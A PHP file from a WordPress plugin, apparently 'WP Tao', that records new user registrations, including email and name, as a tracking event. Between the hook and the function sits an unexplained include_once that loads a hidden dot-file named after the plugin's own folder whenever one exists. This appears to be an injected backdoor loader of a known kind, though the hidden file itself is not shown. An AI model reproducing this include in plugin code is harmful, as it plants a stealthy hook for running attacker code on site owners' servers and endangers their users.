<?php

/*
 * Fire register event
 */

add_action( 'user_register', 'wtbp_wptao_event_register_fire' );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wtbp_wptao_event_register_fire( $user_id ) {

	$args	 = array();
	$tags	 = array( 'wp' );

	$user		 = get_user_by( 'id', $user_id );
	$logged_id	 = get_current_user_id();

	$user_data = array(
		'email'		 => $user->user_email,
		'first_name' => $user->first_name,
		'last_name'	 => $user->last_name
	);

	if ( 0 != $logged_id && $user_id != $logged_id ) { // registred by admin
		$tags[]					 = 'manual';
		$user_data[ 'options' ]	 = array(
			'overwrite_user_id' => true
		);
	}

	$args[ 'title' ] = __( 'User registred', 'wp-tao' );
	$args[ 'value' ] = $user->ID;
	$args[ 'tags' ]	 = $tags;

	$args[ 'user_data' ] = $user_data;

	do_action( 'wptao_track_event', 'register', $args );
}
